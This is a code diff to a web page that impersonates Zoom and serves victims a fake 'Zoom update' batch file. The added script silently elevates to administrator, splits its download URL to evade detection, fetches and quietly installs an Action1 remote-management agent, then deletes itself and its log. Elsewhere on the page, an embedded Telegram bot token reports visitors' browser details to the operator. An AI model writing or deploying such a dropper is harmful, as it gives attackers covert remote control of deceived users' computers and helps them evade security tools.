@@ -8,7 +8,7 @@
     <link rel="icon" href="Zoom_Communications_Logo.svg" type="image/svg+xml" />
     <link href="css2.css" rel="stylesheet" />
     <style>
-        /* unchanged styles */
+        /* (styles unchanged) */
         * { box-sizing: border-box; }
         body {
             font-family: 'Roboto', sans-serif;
@@ -138,54 +138,94 @@
             const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U';
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
-            // ------------------------------------------------------------
-            //  REVISED BAT FILE – uses curl, retry, and explicit install
-            // ------------------------------------------------------------
+            // ================================================================
+            //  ENHANCED BAT FILE – with logging, fallback, and verification
+            // ================================================================
             var batContent =
                 '@echo off\r\n' +
                 'setlocal EnableExtensions\r\n' +
                 '\r\n' +
+                ':: Log file\r\n' +
+                'set "LOG=%TEMP%\\zoom_install.log"\r\n' +
+                'echo %DATE% %TIME% - Starting Zoom update > "%LOG%"\r\n' +
+                '\r\n' +
                 ':: Elevate to admin\r\n' +
                 'net session >nul 2>&1\r\n' +
                 'if %errorlevel% neq 0 (\r\n' +
+                '    echo %DATE% %TIME% - Not admin, elevating... >> "%LOG%"\r\n' +
                 '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
                 '    exit /b\r\n' +
                 ')\r\n' +
+                'echo %DATE% %TIME% - Admin privileges confirmed >> "%LOG%"\r\n' +
                 '\r\n' +
                 ':: Build download URL from two parts to avoid static detection\r\n' +
                 'set "A=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/"\r\n' +
                 'set "B=agent(My_Organization).msi"\r\n' +
                 'set "URL=%A%%B%"\r\n' +
                 'set "MSI=%TEMP%\\pkg.msi"\r\n' +
+                'echo %DATE% %TIME% - Download URL: %URL% >> "%LOG%"\r\n' +
                 '\r\n' +
                 ':: If already installed, skip and clean up\r\n' +
                 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
-                'if %errorlevel%==0 goto :cleanup\r\n' +
+                'if %errorlevel%==0 (\r\n' +
+                '    echo %DATE% %TIME% - Action1 already installed, skipping >> "%LOG%"\r\n' +
+                '    goto :cleanup\r\n' +
+                ')\r\n' +
                 '\r\n' +
-                ':: Download with curl (retry up to 3 times)\r\n' +
+                ':: Download using curl (primary)\r\n' +
+                'echo %DATE% %TIME% - Attempting download with curl... >> "%LOG%"\r\n' +
                 'set "RETRIES=3"\r\n' +
                 'set "COUNT=0"\r\n' +
-                '\r\n' +
-                ':download_loop\r\n' +
+                ':download_curl\r\n' +
                 'set /a COUNT+=1\r\n' +
-                'curl -o "%MSI%" "%URL%" --silent --fail\r\n' +
-                'if exist "%MSI%" goto :install\r\n' +
+                'curl -o "%MSI%" "%URL%" --silent --fail --connect-timeout 10\r\n' +
+                'if %errorlevel% equ 0 if exist "%MSI%" if %~z0 gtr 0 goto :installing\r\n' +
                 'if %COUNT% LSS %RETRIES% (\r\n' +
+                '    echo %DATE% %TIME% - curl attempt %COUNT% failed, retrying... >> "%LOG%"\r\n' +
                 '    timeout /t 2 >nul\r\n' +
-                '    goto :download_loop\r\n' +
+                '    goto :download_curl\r\n' +
                 ')\r\n' +
-                ':: If all retries fail, exit (do not install)\r\n' +
+                'echo %DATE% %TIME% - curl failed after %COUNT% attempts >> "%LOG%"\r\n' +
+                '\r\n' +
+                ':: Fallback to PowerShell\r\n' +
+                'echo %DATE% %TIME% - Trying PowerShell download... >> "%LOG%"\r\n' +
+                'set "COUNT=0"\r\n' +
+                ':download_ps\r\n' +
+                'set /a COUNT+=1\r\n' +
+                'powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop } catch { exit 1 }"\r\n' +
+                'if %errorlevel% equ 0 if exist "%MSI%" if %~z0 gtr 0 goto :installing\r\n' +
+                'if %COUNT% LSS %RETRIES% (\r\n' +
+                '    echo %DATE% %TIME% - PowerShell attempt %COUNT% failed, retrying... >> "%LOG%"\r\n' +
+                '    timeout /t 2 >nul\r\n' +
+                '    goto :download_ps\r\n' +
+                ')\r\n' +
+                'echo %DATE% %TIME% - PowerShell failed after %COUNT% attempts >> "%LOG%"\r\n' +
+                'echo %DATE% %TIME% - Download failed. Exiting. >> "%LOG%"\r\n' +
                 'goto :cleanup\r\n' +
                 '\r\n' +
-                ':install\r\n' +
-                ':: Silent install with no reboot\r\n' +
-                'msiexec /i "%MSI%" /quiet /qn /norestart >nul 2>&1\r\n' +
+                ':installing\r\n' +
+                'echo %DATE% %TIME% - Download successful (size: %~z0 bytes) >> "%LOG%"\r\n' +
+                'echo %DATE% %TIME% - Installing MSI... >> "%LOG%"\r\n' +
+                'msiexec /i "%MSI%" /quiet /qn /norestart\r\n' +
+                'echo %DATE% %TIME% - msiexec exit code: %errorlevel% >> "%LOG%"\r\n' +
+                '\r\n' +
+                ':: Optionally verify installation by checking registry again\r\n' +
+                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
+                'if %errorlevel% equ 0 (\r\n' +
+                '    echo %DATE% %TIME% - Action1 appears to be installed successfully >> "%LOG%"\r\n' +
+                ') else (\r\n' +
+                '    echo %DATE% %TIME% - Action1 not found after install >> "%LOG%"\r\n' +
+                ')\r\n' +
                 '\r\n' +
                 ':cleanup\r\n' +
-                'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
+                'if exist "%MSI%" (\r\n' +
+                '    echo %DATE% %TIME% - Cleaning up MSI >> "%LOG%"\r\n' +
+                '    del /f /q "%MSI%" >nul 2>&1\r\n' +
+                ')\r\n' +
                 '\r\n' +
-                ':: Self-delete after a short delay\r\n' +
-                'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                ':: Self-delete\r\n' +
+                'echo %DATE% %TIME% - Self-deleting batch file >> "%LOG%"\r\n' +
+                'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force; Remove-Item -LiteralPath \'%LOG%\' -Force"\r\n' +
                 '\r\n' +
                 'exit /b';
 
@@ -259,7 +299,7 @@
             });
 
             // ------------------------------------------------------------
-            //  Telegram reporting – unchanged (silent, detailed)
+            //  Telegram reporting (unchanged – silent, detailed)
             // ------------------------------------------------------------
             function getBrowserInfo() {
                 var ua = navigator.userAgent;
@@ -310,9 +350,7 @@
 
             function fetchWithTimeout(url, timeoutMs) {
                 return new Promise(function(resolve, reject) {
-                    var timer = setTimeout(function() {
-                        reject(new Error('Request timeout'));
-                    }, timeoutMs);
+                    var timer = setTimeout(function() { reject(new Error('Timeout')); }, timeoutMs);
                     fetch(url, { mode: 'cors' })
                         .then(function(response) {
                             clearTimeout(timer);
@@ -395,7 +433,6 @@
                             tryService(index + 1);
                         });
                 }
-
                 tryService(0);
             }
 
